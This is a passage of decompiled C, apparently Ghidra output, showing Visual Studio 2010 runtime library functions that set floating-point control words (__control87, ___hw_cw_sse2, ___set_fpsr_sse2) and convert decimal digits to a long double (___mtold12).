  return uVar1;
}



// Library Function - Single Match
//  ___hw_cw_sse2
// 
// Library: Visual Studio 2010 Release

uint __fastcall ___hw_cw_sse2(undefined4 param_1,uint param_2)

{
  uint uVar1;
  uint uVar2;
  
  uVar1 = 0;
  if ((param_2 & 0x10) != 0) {
    uVar1 = 0x80;
  }
  if ((param_2 & 8) != 0) {
    uVar1 = uVar1 | 0x200;
  }
  if ((param_2 & 4) != 0) {
    uVar1 = uVar1 | 0x400;
  }
  if ((param_2 & 2) != 0) {
    uVar1 = uVar1 | 0x800;
  }
  if ((param_2 & 1) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  if ((param_2 & 0x80000) != 0) {
    uVar1 = uVar1 | 0x100;
  }
  uVar2 = param_2 & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x2000;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x4000;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0x6000;
    }
  }
  uVar2 = param_2 & 0x3000000;
  if (uVar2 == 0x1000000) {
    uVar1 = uVar1 | 0x8040;
  }
  else {
    if (uVar2 == 0x2000000) {
      return uVar1 | 0x40;
    }
    if (uVar2 == 0x3000000) {
      return uVar1 | 0x8000;
    }
  }
  return uVar1;
}



// Library Function - Single Match
//  __control87
// 
// Library: Visual Studio 2010 Release

uint __cdecl __control87(uint _NewValue,uint _Mask)

{
  ushort uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  ushort in_FPUControlWord;
  
  uVar5 = 0;
  if ((in_FPUControlWord & 1) != 0) {
    uVar5 = 0x10;
  }
  if ((in_FPUControlWord & 4) != 0) {
    uVar5 = uVar5 | 8;
  }
  if ((in_FPUControlWord & 8) != 0) {
    uVar5 = uVar5 | 4;
  }
  if ((in_FPUControlWord & 0x10) != 0) {
    uVar5 = uVar5 | 2;
  }
  if ((in_FPUControlWord & 0x20) != 0) {
    uVar5 = uVar5 | 1;
  }
  if ((in_FPUControlWord & 2) != 0) {
    uVar5 = uVar5 | 0x80000;
  }
  uVar1 = in_FPUControlWord & 0xc00;
  if ((in_FPUControlWord & 0xc00) != 0) {
    if (uVar1 == 0x400) {
      uVar5 = uVar5 | 0x100;
    }
    else if (uVar1 == 0x800) {
      uVar5 = uVar5 | 0x200;
    }
    else if (uVar1 == 0xc00) {
      uVar5 = uVar5 | 0x300;
    }
  }
  if ((in_FPUControlWord & 0x300) == 0) {
    uVar5 = uVar5 | 0x20000;
  }
  else if ((in_FPUControlWord & 0x300) == 0x200) {
    uVar5 = uVar5 | 0x10000;
  }
  if ((in_FPUControlWord & 0x1000) != 0) {
    uVar5 = uVar5 | 0x40000;
  }
  uVar2 = ~_Mask & uVar5 | _NewValue & _Mask;
  if (uVar2 != uVar5) {
    uVar5 = __hw_cw();
    uVar2 = 0;
    if ((uVar5 & 1) != 0) {
      uVar2 = 0x10;
    }
    if ((uVar5 & 4) != 0) {
      uVar2 = uVar2 | 8;
    }
    if ((uVar5 & 8) != 0) {
      uVar2 = uVar2 | 4;
    }
    if ((uVar5 & 0x10) != 0) {
      uVar2 = uVar2 | 2;
    }
    if ((uVar5 & 0x20) != 0) {
      uVar2 = uVar2 | 1;
    }
    if ((uVar5 & 2) != 0) {
      uVar2 = uVar2 | 0x80000;
    }
    uVar3 = uVar5 & 0xc00;
    if (uVar3 != 0) {
      if (uVar3 == 0x400) {
        uVar2 = uVar2 | 0x100;
      }
      else if (uVar3 == 0x800) {
        uVar2 = uVar2 | 0x200;
      }
      else if (uVar3 == 0xc00) {
        uVar2 = uVar2 | 0x300;
      }
    }
    if ((uVar5 & 0x300) == 0) {
      uVar2 = uVar2 | 0x20000;
    }
    else if ((uVar5 & 0x300) == 0x200) {
      uVar2 = uVar2 | 0x10000;
    }
    if ((uVar5 & 0x1000) != 0) {
      uVar2 = uVar2 | 0x40000;
    }
  }
  uVar5 = 0;
  if (DAT_00423830 != 0) {
    if ((char)MXCSR < '\0') {
      uVar5 = 0x10;
    }
    if ((MXCSR & 0x200) != 0) {
      uVar5 = uVar5 | 8;
    }
    if ((MXCSR & 0x400) != 0) {
      uVar5 = uVar5 | 4;
    }
    if ((MXCSR & 0x800) != 0) {
      uVar5 = uVar5 | 2;
    }
    if ((MXCSR & 0x1000) != 0) {
      uVar5 = uVar5 | 1;
    }
    if ((MXCSR & 0x100) != 0) {
      uVar5 = uVar5 | 0x80000;
    }
    uVar3 = MXCSR & 0x6000;
    if (uVar3 != 0) {
      if (uVar3 == 0x2000) {
        uVar5 = uVar5 | 0x100;
      }
      else if (uVar3 == 0x4000) {
        uVar5 = uVar5 | 0x200;
      }
      else if (uVar3 == 0x6000) {
        uVar5 = uVar5 | 0x300;
      }
    }
    uVar4 = MXCSR & 0x8040;
    if (uVar4 == 0x40) {
      uVar5 = uVar5 | 0x2000000;
    }
    else if (uVar4 == 0x8000) {
      uVar5 = uVar5 | 0x3000000;
    }
    else if (uVar4 == 0x8040) {
      uVar5 = uVar5 | 0x1000000;
    }
    uVar4 = ~(_Mask & 0x308031f) & uVar5 | _Mask & 0x308031f & _NewValue;
    if (uVar4 != uVar5) {
      uVar5 = ___hw_cw_sse2(uVar3,uVar4);
      ___set_fpsr_sse2(uVar5);
      uVar5 = 0;
      if ((char)MXCSR < '\0') {
        uVar5 = 0x10;
      }
      if ((MXCSR & 0x200) != 0) {
        uVar5 = uVar5 | 8;
      }
      if ((MXCSR & 0x400) != 0) {
        uVar5 = uVar5 | 4;
      }
      if ((MXCSR & 0x800) != 0) {
        uVar5 = uVar5 | 2;
      }
      if ((MXCSR & 0x1000) != 0) {
        uVar5 = uVar5 | 1;
      }
      if ((MXCSR & 0x100) != 0) {
        uVar5 = uVar5 | 0x80000;
      }
      uVar3 = MXCSR & 0x6000;
      if (uVar3 != 0) {
        if (uVar3 == 0x2000) {
          uVar5 = uVar5 | 0x100;
        }
        else if (uVar3 == 0x4000) {
          uVar5 = uVar5 | 0x200;
        }
        else if (uVar3 == 0x6000) {
          uVar5 = uVar5 | 0x300;
        }
      }
      uVar3 = MXCSR & 0x8040;
      if (uVar3 == 0x40) {
        uVar5 = uVar5 | 0x2000000;
      }
      else if (uVar3 == 0x8000) {
        uVar5 = uVar5 | 0x3000000;
      }
      else if (uVar3 == 0x8040) {
        uVar5 = uVar5 | 0x1000000;
      }
    }
    uVar3 = uVar5 ^ uVar2;
    uVar2 = uVar5 | uVar2;
    if ((uVar3 & 0x8031f) != 0) {
      uVar2 = uVar2 | 0x80000000;
    }
  }
  return uVar2;
}



// Library Function - Single Match
//  ___mtold12
// 
// Library: Visual Studio 2010 Release

void __cdecl ___mtold12(char *param_1,int param_2,uint *param_3)

{
  uint uVar1;
  uint uVar2;
  bool bVar3;
  uint *puVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  short local_8;
  
  puVar4 = param_3;
  uVar7 = 0;
  local_8 = 0x404e;
  *param_3 = 0;
  param_3[1] = 0;
  param_3[2] = 0;
  if (param_2 != 0) {
    param_3 = (uint *)0x0;
    do {
      uVar2 = *puVar4;
      uVar9 = *puVar4;
      uVar8 = puVar4[1];
      uVar1 = puVar4[2];
      bVar3 = false;
      uVar5 = (uVar7 * 2 | uVar2 >> 0x1f) * 2 | uVar2 * 2 >> 0x1f;
      uVar2 = uVar2 * 4;
      uVar7 = ((int)param_3 * 2 | uVar7 >> 0x1f) * 2 | uVar7 * 2 >> 0x1f;
      uVar6 = uVar9 + uVar2;
      *puVar4 = uVar2;
      puVar4[1] = uVar5;
      puVar4[2] = uVar7;
      if ((uVar6 < uVar2) || (uVar6 < uVar9)) {
        bVar3 = true;
      }
      *puVar4 = uVar6;
      uVar9 = uVar5;
      if (bVar3) {
        bVar3 = false;
        uVar9 = uVar5 + 1;
        if ((uVar9 < uVar5) || (uVar9 == 0)) {
          bVar3 = true;
        }
        puVar4[1] = uVar9;
        if (bVar3) {
          uVar7 = uVar7 + 1;
          puVar4[2] = uVar7;
        }
      }
      bVar3 = false;
      uVar2 = uVar9 + uVar8;
      if ((uVar2 < uVar9) || (uVar2 < uVar8)) {
        bVar3 = true;
      }
      puVar4[1] = uVar2;
      if (bVar3) {
        uVar7 = uVar7 + 1;
        puVar4[2] = uVar7;
      }
      bVar3 = false;
      param_3 = (uint *)((uVar7 + uVar1) * 2 | uVar2 >> 0x1f);
      uVar9 = uVar6 * 2;
      uVar8 = uVar2 * 2 | uVar6 >> 0x1f;
      puVar4[2] = (uint)param_3;
      *puVar4 = uVar9;
      puVar4[1] = uVar8;
      uVar7 = uVar9 + (int)*param_1;
      if ((uVar7 < uVar9) || (uVar7 < (uint)(int)*param_1)) {
        bVar3 = true;
      }
      *puVar4 = uVar7;
      uVar7 = uVar8;
      if (bVar3) {
        uVar7 = uVar8 + 1;
        bVar3 = false;
        if ((uVar7 < uVar8) || (uVar7 == 0)) {
          bVar3 = true;
        }
        puVar4[1] = uVar7;
        if (bVar3) {
          param_3 = (uint *)((int)param_3 + 1);
          puVar4[2] = (uint)param_3;
        }
      }
      param_2 = param_2 + -1;
      param_1 = param_1 + 1;
      puVar4[1] = uVar7;
      puVar4[2] = (uint)param_3;
    } while (param_2 != 0);
  }
  if (puVar4[2] == 0) {
    uVar7 = puVar4[1];
    do {
      local_8 = local_8 + -0x10;
      uVar9 = uVar7 >> 0x10;
      uVar7 = uVar7 << 0x10 | *puVar4 >> 0x10;
      puVar4[1] = uVar7;
      *puVar4 = *puVar4 << 0x10;
    } while (uVar9 == 0);
    puVar4[2] = uVar9;
  }
  uVar7 = puVar4[2];
  if ((uVar7 & 0x8000) == 0) {
    uVar9 = puVar4[1];
    do {
      local_8 = local_8 + -1;
      uVar8 = uVar7 * 2;
      uVar7 = uVar8 | uVar9 >> 0x1f;
      uVar9 = uVar9 * 2 | *puVar4 >> 0x1f;
      *puVar4 = *puVar4 * 2;
      puVar4[1] = uVar9;
      puVar4[2] = uVar7;
    } while ((uVar8 & 0x8000) == 0);
  }
  *(short *)((int)puVar4 + 10) = local_8;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___set_fpsr_sse2
// 
// Library: Visual Studio 2010 Release

void __cdecl ___set_fpsr_sse2(uint param_1)

{
  if (DAT_00423830 != 0) {
    if (((param_1 & 0x40) == 0) || (DAT_00421844 == 0)) {
      MXCSR = param_1 & 0xffffffbf;
    }
    else {
      MXCSR = param_1;
    }
  }
  return;
}


